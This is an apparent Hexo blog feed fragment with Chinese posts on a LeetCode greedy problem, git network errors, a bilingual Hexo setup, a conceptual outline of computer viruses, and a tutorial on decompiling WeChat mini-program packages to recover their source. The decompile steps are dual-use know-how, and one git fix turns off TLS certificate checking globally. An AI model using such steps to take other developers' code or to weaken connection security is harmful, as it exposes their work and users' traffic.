<p>需要注意的是，如果不使用Vector作为数组进行参数传递，那么在传递数组引用是需要再传递一个数组的大小，否则在函数中无法根据首地址计算出数组大小。</p>
]]></content>
      <categories>
        <category>c&amp;c++</category>
      </categories>
      <tags>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode刷题:455.分发饼干</title>
    <url>/article/4d94effd.html</url>
    <content><![CDATA[<h1 id="LeetCode刷题-455-分发饼干"><a href="#LeetCode刷题-455-分发饼干" class="headerlink" title="LeetCode刷题:455.分发饼干"></a>LeetCode刷题:455.分发饼干</h1><a id="more"></a>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>假设你是一位很棒的家长，想要给你的孩子们一些小饼干。但是，每个孩子最多只能给一块饼干。</p>
<p>对每个孩子 i，都有一个胃口值 g[i]，这是能让孩子们满足胃口的饼干的最小尺寸；并且每块饼干 j，都有一个尺寸 s[j] 。如果 s[j] &gt;= g[i]，我们可以将这个饼干 j 分配给孩子 i ，这个孩子会得到满足。你的目标是尽可能满足越多数量的孩子，并输出这个最大数值。</p>
<p><strong>示例 1:</strong></p>
<p>输入: g = [1,2,3], s = [1,1]<br>输出: 1<br>解释:<br>你有三个孩子和两块小饼干，3个孩子的胃口值分别是：1,2,3。<br>虽然你有两块小饼干，由于他们的尺寸都是1，你只能让胃口值是1的孩子满足。<br>所以你应该输出1。<br><strong>示例 2:</strong></p>
<p>输入: g = [1,2], s = [1,2,3]<br>输出: 2<br>解释:<br>你有两个孩子和三块小饼干，2个孩子的胃口值分别是1,2。<br>你拥有的饼干数量和尺寸都足以让所有孩子满足。<br>所以你应该输出2.</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>因为饥饿度最小的孩子最容易吃饱，所以我们先考虑这个孩子。为了尽量使得剩下的饼干可以满足饥饿度更大的孩子，所以我们应该把大于等于这个孩子饥饿度的、且大小最小的饼干给这个孩子。满足了这个孩子之后，我们采取同样的策略，考虑剩下孩子里饥饿度最小的孩子，直到没有满足条件的饼干存在。</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findContentChildren</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; g, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">        sort(g.begin(),g.end());</span><br><span class="line">        sort(s.begin(),s.end());</span><br><span class="line">        <span class="keyword">while</span>(i&lt;g.size()&amp;&amp;j&lt;s.size())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(g[i]&lt;=s[j])i++;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>反编译获取微信小程序源码</title>
    <url>/article/852da69a.html</url>
    <content><![CDATA[<h1 id="简单几步获取微信小程序源码"><a href="#简单几步获取微信小程序源码" class="headerlink" title="简单几步获取微信小程序源码"></a>简单几步获取微信小程序源码</h1><p>本文记录了我通过反编译获得微信小程序源码的过程.</p>
<h2 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1.环境准备"></a>1.环境准备</h2><p>1.下载node.js,直接去<a href="https://nodejs.org/en/">官网</a>下载,安装教程点击<a href="https://blog.csdn.net/moshangduanchang/article/details/105787602">链接</a>查看</p>
<p>2.反编译的脚本</p>
<p>这里直接提供,点击<a href="https://wws.lanzous.com/iixTIifqaod">链接</a>下载,下载后解压即可</p>
<p>3.手机模拟器,这里我用的夜神模拟器,给出<a href="https://www.yeshen.com/">官网链接</a>,安装一路默认即可</p>
<p>4.RE文件管理器(非必须),我觉得这个更好操作</p>
<h2 id="2-在夜神模拟器中下载微信并登录-找到想获取源码的小程序运行-建议登录微信后不要立即打开小程序-不然不好找小程序源文件包"><a href="#2-在夜神模拟器中下载微信并登录-找到想获取源码的小程序运行-建议登录微信后不要立即打开小程序-不然不好找小程序源文件包" class="headerlink" title="2.在夜神模拟器中下载微信并登录,找到想获取源码的小程序运行(建议登录微信后不要立即打开小程序,不然不好找小程序源文件包)"></a>2.在夜神模拟器中下载微信并登录,找到想获取源码的小程序运行(建议登录微信后不要立即打开小程序,不然不好找小程序源文件包)</h2><h2 id="3-找到微信小程序源文件包"><a href="#3-找到微信小程序源文件包" class="headerlink" title="3.找到微信小程序源文件包"></a>3.找到微信小程序源文件包</h2><p>在下面目录下,</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;data&#x2F;data&#x2F;com.tencent.mm&#x2F;MicroMsg&#x2F;&#123;&#123;一串32位的16进制字符串文件夹&#125;&#125;&#x2F;appbrand&#x2F;pkg&#x2F;</span><br></pre></td></tr></table></figure>
<p>会发现一些 <code>xxxxxxx.wxapkg</code> 类型的文件，这些就是微信小程序的包</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ca55d60ff87240b23dd635a4c55095dd.png" alt=""></p>
<p>根据时间确定源文件包</p>
<h2 id="4-将源文件传至电脑"><a href="#4-将源文件传至电脑" class="headerlink" title="4.将源文件传至电脑"></a>4.将源文件传至电脑</h2><p>可以通过夜神模拟器的文件共享,也可以安装QQ,将源文件压缩后传至电脑</p>
<h2 id="5-找到刚才解压的反编译脚本的存放目录-然后win-R打开如下窗口并输入cmd"><a href="#5-找到刚才解压的反编译脚本的存放目录-然后win-R打开如下窗口并输入cmd" class="headerlink" title="5.找到刚才解压的反编译脚本的存放目录,然后win+R打开如下窗口并输入cmd"></a>5.找到刚才解压的反编译脚本的存放目录,然后win+R打开如下窗口并输入cmd</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/870e49a8c940727ccd565c28ec462a74.png" alt=""></p>
<p>点击确定即可,在cd 到这个存放目录,输入以下命令安装依赖</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">npm install esprima</span><br><span class="line">npm install css<span class="literal">-tree</span></span><br><span class="line">npm install cssbeautify</span><br><span class="line">npm install vm2</span><br><span class="line">npm install uglify<span class="literal">-es</span></span><br></pre></td></tr></table></figure>
<h2 id="6-反编译-wxapkg-文件"><a href="#6-反编译-wxapkg-文件" class="headerlink" title="6.反编译 .wxapkg 文件"></a>6.反编译 .wxapkg 文件</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">node .\wuWxapkg.js D:\_<span class="literal">-472979937_90</span>.wxapkg  </span><br><span class="line">D:\_<span class="literal">-472979937_90</span>.wxapkg 改为你存放源文件的绝对目录</span><br></pre></td></tr></table></figure>
<p>运行即可,下图为成功运行</p>
<p><img src="https://i.loli.net/2020/11/15/aporGMPjm974leN.gif" alt=""></p>
<h2 id="7-关于出错"><a href="#7-关于出错" class="headerlink" title="7.关于出错"></a>7.关于出错</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果出现   Cannot find module &#39;xxx&#39;  表示模块未安装</span><br><span class="line">运行命令 npm install &#39;xxx&#39; , 安装依赖</span><br><span class="line">如果遇到 __vd_version_info__ is not defined这种报错</span><br><span class="line">解决方法如下：</span><br></pre></td></tr></table></figure>
<p>修改反编译脚本wuWxss.js代码，将原代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function runVM(name,code)&#123;</span><br><span class="line">    let wxAppCode&#x3D;&#123;&#125;,handle&#x3D;&#123;cssFile:name&#125;;</span><br><span class="line">    let vm&#x3D;new VM(&#123;sandbox:Object.assign(new GwxCfg(),&#123;__wxAppCode__:wxAppCode,setCssToHead:cssRebuild.bind(handle)&#125;)&#125;);</span><br><span class="line">    vm.run(code);</span><br><span class="line">    for(let name in wxAppCode)if(name.endsWith(&quot;.wxss&quot;))&#123;</span><br><span class="line">        handle.cssFile&#x3D;path.resolve(frameName,&quot;..&quot;,name);</span><br><span class="line">        wxAppCode[name]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function runVM(name,code)&#123;</span><br><span class="line">    let wxAppCode&#x3D;&#123;&#125;,handle&#x3D;&#123;cssFile:name&#125;;</span><br><span class="line">    let gg &#x3D; new GwxCfg();</span><br><span class="line">    let tsandbox &#x3D;&#123;$gwx:GwxCfg.prototype[&quot;$gwx&quot;],__mainPageFrameReady__:GwxCfg.prototype[&quot;$gwx&quot;],__wxAppCode__:wxAppCode,setCssToHead:cssRebuild.bind(handle)&#125;;</span><br><span class="line">    let vm &#x3D; new VM(&#123;sandbox:tsandbox&#125;);</span><br><span class="line">    vm.run(code);</span><br><span class="line">    for(let name in wxAppCode)if(name.endsWith(&quot;.wxss&quot;))&#123;</span><br><span class="line">        handle.cssFile&#x3D;path.resolve(frameName,&quot;..&quot;,name);</span><br><span class="line">        wxAppCode[name]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="8-反编译后产生一个文件夹-和源文件同一目录"><a href="#8-反编译后产生一个文件夹-和源文件同一目录" class="headerlink" title="8.反编译后产生一个文件夹,和源文件同一目录"></a>8.反编译后产生一个文件夹,和源文件同一目录</h2><p>打开微信开发者工具导入小程序即可</p>
<p><strong>备注:</strong><br>其他平台小程序可自行尝试</p>
<p><img src="https://img-blog.csdnimg.cn/20201201110158496.jpg#pic_center" alt=""></p>
]]></content>
      <tags>
        <tag>微信小程序</tag>
      </tags>
  </entry>
  <entry>
    <title>git报错及解决方法盘点</title>
    <url>/article/fe55cae0.html</url>
    <content><![CDATA[<h1 id="git报错及解决方法盘点"><a href="#git报错及解决方法盘点" class="headerlink" title="git报错及解决方法盘点"></a>git报错及解决方法盘点</h1><a id="more"></a>
<h2 id="错误一"><a href="#错误一" class="headerlink" title="错误一"></a>错误一</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fatal: unable to access &#39;https:&#x2F;&#x2F;github.com&#x2F;.......git&#x2F;&#39;: Failed to connect to github. com port 443: Timed out</span><br></pre></td></tr></table></figure>
<h3 id="解决方案一"><a href="#解决方案一" class="headerlink" title="解决方案一"></a>解决方案一</h3><p> 1.查看看你的git配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --global -l </span><br></pre></td></tr></table></figure>
<p>如果你没有任何与https代理相关的内容,例如https_proxy = …,则问题不在这里. 如果您有与https代理相关的内容,请将其从〜/ .gitconfig文件中删除,然后重试 </p>
<p>2.如果仍然不起作用,请取消设置环境变量 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">env|grep -i proxy  </span><br></pre></td></tr></table></figure>
<p>你应该有一行或几行https_proxy = … 使用以下内容逐个取消设置:取消设置https_proxy(或HTTPS_PROXY,具体取决于变量的名称)</p>
<p>3.再次检查环境变量    </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">env|grep -i proxy</span><br></pre></td></tr></table></figure>
<p>如果它没有显示任何你应该是好的. 注意:此解决方案可以应用于http和https代理问题.只是变量名称从https更改为http </p>
<h3 id="解决方案二"><a href="#解决方案二" class="headerlink" title="解决方案二"></a>解决方案二</h3><p>1.手动配置git的代理.git客户端输入如下两个命令即可 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --global http.proxy http:&#x2F;&#x2F;127.0.0.1:1080 </span><br><span class="line">git config --global https.proxy http:&#x2F;&#x2F;127.0.0.1:1080</span><br></pre></td></tr></table></figure>
<p>2.取消代理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --global --unset http.proxy  </span><br><span class="line">git config --global --unset https.proxy  </span><br></pre></td></tr></table></figure>
<h2 id="错误二"><a href="#错误二" class="headerlink" title="错误二"></a>错误二</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fatal: unable to access &#39;https:&#x2F;&#x2F;github.com&#x2F;.......git&#x2F;&#39;: failed to receive handshake ssl&#x2F;tls connection failed</span><br></pre></td></tr></table></figure>
<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --global http.sslBackend &quot;openssl&quot;</span><br><span class="line">git config --global http.sslCAInfo [path to .pem file]</span><br></pre></td></tr></table></figure>
<h2 id="错误三"><a href="#错误三" class="headerlink" title="错误三"></a>错误三</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fatal: unable to access &#39;https:&#x2F;&#x2F;github.com&#x2F;.......git&#x2F;&#39;: OpenSSL SSL_read: Connection was reset, errno 10054</span><br></pre></td></tr></table></figure>
<h3 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --global http.sslVerify &quot;false&quot;</span><br></pre></td></tr></table></figure>
<h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>遇到这些问题很可能是因为科学上网,可以关闭试试,暂时就遇到这些问题,后续遇到会补上</p>
]]></content>
  </entry>
  <entry>
    <title>Hexo的next主题实现双语功能</title>
    <url>/article/99e78227.html</url>
    <content><![CDATA[<h1 id="Hexo的next主题实现双语功能"><a href="#Hexo的next主题实现双语功能" class="headerlink" title="Hexo的next主题实现双语功能"></a>Hexo的next主题实现双语功能</h1><a id="more"></a>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前不久,给博客添加了Google Analytics,通过数据显示,发现我这小破站寥寥无几的流量大部分竟然是国外朋友贡献的,心中便想着将博客国际化—-搞个英文版本.说干就干,经过我的一番折腾,终于给搞出来了,但我要说明一下文章的内容是要自己转换为英文,具体效果大家可以点击下面链接前往查看</p>
<p><a href="https://en.idefun.com/" class="LinkCard" target="_blank">英文版本</a></p>
<h2 id="诉求"><a href="#诉求" class="headerlink" title="诉求"></a>诉求</h2><p>首先说说我对英文网站的诉求:</p>
<ol>
<li>英文网站要与原网站的结构外观基本保持一致(我看到有的小伙伴直接换支持双语的主题了,我可不想让自己的心血白流)</li>
<li>我希望原网站和英文网站有个切换按钮,很容易切换</li>
</ol>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h3><p>在hexo本地目录创建英文文件夹(名字自定义),我的是en</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320154606919.png" alt=""></p>
<p>复制hexo目录的内容(node_modules除外)到en文件夹,复制后en文件夹如下</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320154912791.png" alt=""></p>
<p>安装相关插件,在en文件夹使用命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>
<p>修改en文件夹中_config.yml文件,将下图中的language改为en,可以比对着hexo本地目录的_config.yml文件将中文改为相应的英文(如下图的title,subtitle等)</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320155305119.png" alt=""></p>
<p>修改hexo目录next主题配置文件_config.yml文件,找到menu字段,增添language菜单,注意链接要换成自己的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">language: https:&#x2F;&#x2F;en.idefun.com&#x2F; || fa fa-language</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320155819757.png" alt=""></p>
<p>修改next主题文件夹下的languages中的zh-CN.yml,找到menu,添加language:English</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320160213558.png" alt=""></p>
<p>可以在hexo目录使用hexo s查看效果</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320160423212.png" alt=""></p>
<p>同理,修改en文件夹中next主题配置文件_config.yml文件,找到menu字段,增添中文菜单</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">中文: https:&#x2F;&#x2F;www.idefun.com&#x2F; || fa fa-language</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320160547373.png" alt=""></p>
<p>修改en文件夹下themes中next主题文件夹下的languages中的en.yml,找到menu,添加language:中文</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320160801285.png" alt=""></p>
<p>可以在en目录使用hexo s查看效果</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320160357274.png" alt=""></p>
<h3 id="部署配置"><a href="#部署配置" class="headerlink" title="部署配置"></a>部署配置</h3><p>下面提供两种部署方法,第一种不用再创建仓库,第二种要再创建仓库,若想要给英文博客绑定域名建议选择第二种,关于创建仓库及打开github page就不多说了</p>
<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在en文件夹生成英文博客,并将生成的public文件夹中的内容复制到hexo目录下的public文件夹中的en文件夹,推送时只需在hexo目录下推送</p>
<h5 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h5><p>使用下面命令即可实现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; cd en &amp;&amp;  hexo clean &amp;&amp; hexo g &amp;&amp; cd ..&#x2F; &amp;&amp; cp -r en&#x2F;public&#x2F;. public&#x2F;en&#x2F; &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
<p>可以写成shell脚本,我这里提供一份简单的脚本供大家参考</p>
<p><a href="https://idefun.lanzous.com/i4cz6n4ov7e" class="LinkCard">点击下载</a></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320162843893.png" alt=""></p>
<p>下载后改后缀为sh即可双击运行</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320162956255.png" alt=""></p>
<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>在en文件夹生成英文博客,将生成英文博客推送到一个新的仓库,需要分别推送,可以编写相应脚本来简化操作</p>
<h5 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h5><p>修改en文件夹在_config.yml文件,找到deploy字段,修改为自己的仓库即可</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320163232780.png" alt=""></p>
<h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>为大家提供一种思路,希望有帮助</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>next</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机病毒原理与防治</title>
    <url>/article/53598.html</url>
    <content><![CDATA[<h1 id="计算机病毒原理与防治"><a href="#计算机病毒原理与防治" class="headerlink" title="计算机病毒原理与防治"></a>计算机病毒原理与防治</h1><a id="more"></a>
<h2 id="计算机病毒概述"><a href="#计算机病毒概述" class="headerlink" title="计算机病毒概述"></a>计算机病毒概述</h2><h3 id="计算机病毒的简介和特征"><a href="#计算机病毒的简介和特征" class="headerlink" title="计算机病毒的简介和特征"></a>计算机病毒的简介和特征</h3><h4 id="计算机病毒的简介"><a href="#计算机病毒的简介" class="headerlink" title="计算机病毒的简介"></a>计算机病毒的简介</h4><ul>
<li>F.Cohen博士:计算机病毒是一段附着在其它程序上的、可以自我繁殖的程序代码.复制后生成的新病毒同样具有感染其它程序的功能</li>
<li>《中华人民共和国计算机病毒防治管理办法》:计算机病毒是指编制或者在计算机程序中插入的破坏计算机功能或者毁坏数据,影响计算机使用,并能自我复制的一组计算机指令或者程序代码</li>
<li>狭义: 一组能够进行自我传播、需要用户干预来触发执行的破坏性程序或代码</li>
<li>广义:包含狭义上的计算机病毒,还包含蠕虫、木马、后门、僵尸、Rootkit、流氓软件、间谍软件、广告软件、Exploit、黑客工具等</li>
<li>在生命周期中,病毒一般会经历如下四个阶段:<ul>
<li>潜伏阶段</li>
<li>传染阶段</li>
<li>触发阶段</li>
<li>发作阶段(表现/破坏)</li>
</ul>
</li>
</ul>
<blockquote>
<p>潜伏阶段:该阶段病毒处于休眠状态,这些病毒最终会被某些条件(如日期，某特定程序或特定文件的出现,内存的容量超过一定范围等)所激活.当然,并不是所有的病毒都经历此阶段</p>
<p>传播阶段:病毒程序将自身复制到其他程序或磁盘的某个区域上,或者传播到其他计算机中,每个被感染的程序或者计算机又因此包含了病毒的复制品,从而也就进入了传播阶段</p>
<p>触发阶段:病毒在被激活后,会执行某一特定功能从而达到某种目的.和处于潜伏期的病毒一样,触发阶段病毒的触发条件是一些系统事件,譬如可以为病毒复制自身的次数,也可以是系统日期或者时间,如CIH1.2病毒于4月26日爆发</p>
<p>发作阶段:病毒在触发条件成熟时,即可在系统中发作.由病毒发作体现出来的破坏程度是不同的:有些是无害的,有些则给系统带来巨大危害</p>
</blockquote>
<h4 id="计算机病毒的特征"><a href="#计算机病毒的特征" class="headerlink" title="计算机病毒的特征"></a>计算机病毒的特征</h4><ul>
<li>传染性<ul>
<li>具有把自身复制到其它程序中的能力</li>
</ul>
</li>
<li>非授权性</li>
<li>隐蔽性、潜伏性</li>
<li>不可预见性</li>
<li><p>破坏性(破坏性取决于病毒设计者的目的和水平)</p>
<ul>
<li>破坏数据信息</li>
<li>抢占系统资源</li>
<li>破坏硬件</li>
</ul>
</li>
<li><p>可触发性</p>
<ul>
<li>计算机病毒因某个事件或数值的出现,诱使病毒实施感染或进行攻击的特性称为可触发性</li>
</ul>
</li>
</ul>
<h4 id="计算机病毒的结构方式"><a href="#计算机病毒的结构方式" class="headerlink" title="计算机病毒的结构方式"></a>计算机病毒的结构方式</h4><ul>
<li>编码方式:大多数采用汇编语言编写</li>
<li>破坏机制:循环执行,破坏系统</li>
<li>结构方式:指令程序的物理存储</li>
</ul>
<blockquote>
<p>计算机所能识别的语言只有<a href="https://www.baidu.com/s?wd=机器语言&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao">机器语言</a>,即由0和1构成的代码.但通常人们编程时,不采用<a href="https://www.baidu.com/s?wd=机器语言&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao">机器语言</a>,因为它非常难于记忆和识别.目前通用的<a href="https://www.baidu.com/s?wd=编程语言&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao">编程语言</a>有两种形式<a href="https://www.baidu.com/s?wd=汇编语言&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao">汇编语言</a>和高级语言.<a href="https://www.baidu.com/s?wd=汇编语言&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao">汇编语言</a>的实质和机器语言是相同的,都是直接对硬件操作,只不过指令采用了英文缩写的标识符,更容易识别和记忆</p>
</blockquote>
<h3 id="计算机病毒的分类"><a href="#计算机病毒的分类" class="headerlink" title="计算机病毒的分类"></a>计算机病毒的分类</h3><h4 id="按病毒攻击的机型分类"><a href="#按病毒攻击的机型分类" class="headerlink" title="按病毒攻击的机型分类"></a>按病毒攻击的机型分类</h4><ul>
<li>攻击微型机的病毒</li>
<li>攻击小型机的病毒</li>
<li>攻击工作站的病毒</li>
</ul>
<h4 id="按病毒攻击的操作系统分类"><a href="#按病毒攻击的操作系统分类" class="headerlink" title="按病毒攻击的操作系统分类"></a>按病毒攻击的操作系统分类</h4><ul>
<li>DOS (PingPong,YanKee,DirII…)</li>
<li>Windows (Boza,Punch,CIH…)</li>
<li>UNIX (Bliss,Adore…)</li>
<li>Macintosh 麦金托什(Mac.simpsons)</li>
<li>OS/2 (蓝色怪人) </li>
<li>其它操作系统(手机病毒、PDA病毒)</li>
</ul>
<h4 id="按病毒的破坏情况分类"><a href="#按病毒的破坏情况分类" class="headerlink" title="按病毒的破坏情况分类"></a>按病毒的破坏情况分类</h4><ul>
<li>良性病毒(无害病毒、无危险病毒)<ul>
<li>是不包含对计算机系统产生直接破坏作用的代码的计算机病毒</li>
</ul>
</li>
<li>恶性病毒(危险病毒、极为危险病毒)<ul>
<li>指在代码中包含有破坏计算机系统操作代码的计算机病毒</li>
</ul>
</li>
</ul>
<h4 id="按传播媒介分类"><a href="#按传播媒介分类" class="headerlink" title="按传播媒介分类"></a>按传播媒介分类</h4><ul>
<li>单机病毒<ul>
<li>单机病毒的载体是磁盘或光盘.常见的是通过从软盘传入硬盘,感染系统后,再传染其它软盘.软盘又感染其它系统</li>
</ul>
</li>
<li>网络病毒<ul>
<li>网络为病毒提供了最好的传播途径,它的破坏力是前所未有的.网络病毒利用计算机网络的协议或命令以及Email等进行传播,常见的是通过QQ、BBS、Email、FTP、Web等传播</li>
</ul>
</li>
</ul>
<h4 id="按病毒的寄生方式和感染途径分类"><a href="#按病毒的寄生方式和感染途径分类" class="headerlink" title="按病毒的寄生方式和感染途径分类"></a>按病毒的寄生方式和感染途径分类</h4><ul>
<li>引导型病毒<ul>
<li>主要使用病毒的全部或部分代码取代正常的引导记录,而将正常的引导记录隐藏在其他地方(感染硬盘,软盘主引导扇区)</li>
</ul>
</li>
<li>文件型病毒<ul>
<li>寄生在可执行程序中,一旦程序执行,病毒就被激活,进行预定活动</li>
</ul>
</li>
<li>混合型病毒<ul>
<li>多型病毒(文件和引导型)感染文件和引导扇区两种目标,这样的病毒通常都具有复杂的算法,它们使用非常规的办法侵入系统,同时使用了加密和变形算法</li>
</ul>
</li>
</ul>
<h3 id="计算机病毒的传播途径"><a href="#计算机病毒的传播途径" class="headerlink" title="计算机病毒的传播途径"></a>计算机病毒的传播途径</h3><ul>
<li>感染本地文件、局域网共享目录中的文件(复制副本到对方目录)</li>
<li>寻找Email地址,发送垃圾邮件(携带病毒体)</li>
<li>通过网络共享软件(如KaZza)传播</li>
<li>通过后门进行传播</li>
<li>通过IRC传播(QQ、MSN…)</li>
<li>通过U盘、硬盘、光盘等磁介质传播</li>
<li>利用软件漏洞进行传播</li>
<li>无线电、短信…</li>
</ul>
<h3 id="计算机病毒的基本防治方法"><a href="#计算机病毒的基本防治方法" class="headerlink" title="计算机病毒的基本防治方法"></a>计算机病毒的基本防治方法</h3><h4 id="应持有的态度"><a href="#应持有的态度" class="headerlink" title="应持有的态度"></a>应持有的态度</h4><ul>
<li>不存在这样一种反病毒软硬件,能够防治未来产生的所有病毒</li>
<li>不存在这样一种病毒程序,能够让未来的所有反病毒软硬件都无法检测</li>
<li>目前的反病毒软件和硬件以及安全产品都是易耗品</li>
<li>必须经常进行更新、升级</li>
<li>病毒产生在前,反病毒手段滞后的现状,将是一个长期的过程</li>
</ul>
<h4 id="原则"><a href="#原则" class="headerlink" title="原则"></a>原则</h4><blockquote>
<p>预防为主,防治结合</p>
</blockquote>
<h4 id="基本防治方法"><a href="#基本防治方法" class="headerlink" title="基本防治方法"></a>基本防治方法</h4><ul>
<li>提高防范意识<ul>
<li>个人不传播、编制计算机病毒</li>
<li>不打开来历不明、未预期收到的邮件</li>
<li>不随便访问某些网站、不随便在这些网站上下载文件</li>
<li>重要文件定期备份</li>
</ul>
</li>
<li>提高操作系统的抗病毒能力<ul>
<li>问题:操作系统漏洞</li>
<li>解决:提高操作系统的抗病毒能力.打开系统自动更新,尽快获得补丁</li>
</ul>
</li>
<li>安装反病毒软件和防火墙<ul>
<li>瑞星、金山、Norton、卡巴斯基、Macfee…</li>
<li>注意定期更新病毒库</li>
</ul>
</li>
</ul>
<h2 id="计算机病毒基础知识"><a href="#计算机病毒基础知识" class="headerlink" title="计算机病毒基础知识"></a>计算机病毒基础知识</h2><h2 id="计算机病毒的基本机制"><a href="#计算机病毒的基本机制" class="headerlink" title="计算机病毒的基本机制"></a>计算机病毒的基本机制</h2><h2 id="DOS病毒分析"><a href="#DOS病毒分析" class="headerlink" title="DOS病毒分析"></a>DOS病毒分析</h2><h2 id="Windows病毒分析"><a href="#Windows病毒分析" class="headerlink" title="Windows病毒分析"></a>Windows病毒分析</h2><h2 id="病毒技巧"><a href="#病毒技巧" class="headerlink" title="病毒技巧"></a>病毒技巧</h2><h2 id="漏洞与网络蠕虫"><a href="#漏洞与网络蠕虫" class="headerlink" title="漏洞与网络蠕虫"></a>漏洞与网络蠕虫</h2><h2 id="特洛伊木马与Rootkit"><a href="#特洛伊木马与Rootkit" class="headerlink" title="特洛伊木马与Rootkit"></a>特洛伊木马与Rootkit</h2><h2 id="病毒对抗技术"><a href="#病毒对抗技术" class="headerlink" title="病毒对抗技术"></a>病毒对抗技术</h2><h2 id="计算机病毒的防范"><a href="#计算机病毒的防范" class="headerlink" title="计算机病毒的防范"></a>计算机病毒的防范</h2><h2 id="Unix病毒和手机病毒"><a href="#Unix病毒和手机病毒" class="headerlink" title="Unix病毒和手机病毒"></a>Unix病毒和手机病毒</h2>]]></content>
      <categories>
        <category>病毒</category>
      </categories>
      <tags>
        <tag>病毒</tag>
        <tag>计算机</tag>
      </tags>
  </entry>
  <entry>
    <title>概率论与数理统计</title>
    <url>/article/6768.html</url>
    <content><![CDATA[<h1 id="概率论与数理统计"><a href="#概率论与数理统计" class="headerlink" title="概率论与数理统计"></a>概率论与数理统计</h1><a id="more"></a>
